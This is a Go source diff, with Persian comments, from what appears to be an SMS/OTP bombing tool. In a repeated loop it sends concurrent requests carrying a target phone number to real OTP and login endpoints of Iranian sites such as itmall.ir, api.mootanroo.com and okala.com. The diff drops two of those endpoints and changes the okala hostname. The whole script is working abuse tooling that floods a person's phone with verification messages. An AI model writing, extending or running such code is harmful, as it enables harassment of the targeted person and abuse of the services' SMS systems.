@@ -260,38 +260,11 @@ func main() {
 	}
 
 	for i := 0; i < repeatCount; i++ {
-		// کدهای قبلی شما (itmall.ir و api.mootanroo.com)
-		// 1. itmall.ir (Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("action", "digits_check_mob")
-			formData.Set("countrycode", "+98")
-			formData.Set("mobileNo", phone)
-			formData.Set("csrf", "e57d035242")
-			formData.Set("login", "2")
-			formData.Set("username", "")
-			formData.Set("email", "")
-			formData.Set("captcha", "")
-			formData.Set("captcha_ses", "")
-			formData.Set("json", "1")
-			formData.Set("whatsapp", "0")
-			sendFormRequest(ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
-		// 1. api.mootanroo.com (JSON)
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp", map[string]interface{}{
-				"PhoneNumber": phone,
-			}, &wg, ch)
-		}
-
-		// --- اضافه کردن URLهای جدید ---
 
 		// okala.com - OTPRegister (JSON)
 		wg.Add(1)
 		tasks <- func() {
-			sendJSONRequest(ctx, "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister", map[string]interface{}{
+			sendJSONRequest(ctx, "https://apigateway.ok.ala.com/api/voyager/C/CustomerAccount/OTPRegister", map[string]interface{}{
 				"mobile":                     phone,
 				"confirmTerms":               true,
 				"notRobot":                   false,
@@ -300,7 +273,7 @@ func main() {
 				"IsAppOnly":                  false,
 				"deviceTypeCode":             7,
 				// سایر فیلدهای موجود در Payload اصلی را می‌توانید اینجا اضافه کنید اگر نیاز باشد
-			}, &wg, ch)
+			}, &wg, ch)//⚠️
 		}
 
 		// okala.com - SaveUserInfo (JSON)
